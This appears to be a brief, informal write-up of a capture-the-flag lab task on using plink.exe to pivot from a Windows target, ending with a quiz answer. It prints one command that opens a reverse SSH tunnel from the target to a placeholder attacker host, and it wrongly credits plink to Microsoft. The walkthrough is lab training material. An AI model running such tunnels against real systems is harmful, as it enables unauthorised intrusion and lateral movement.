**TASK 12: plink.exe**

Well this is a tool used by microsoft for doing the ssh client thingy...

Generally speaking, Windows servers are unlikely to have an SSH server(noiceeee)running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:

    cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

Nothing intresting in this task if you want just go through the  task there u will see the tool name puttygen (which we will never use)
anyhow read about it..

**Q.  What tool can be used to convert OpenSSH keys into PuTTY style keys?**

Ans: Puttygen
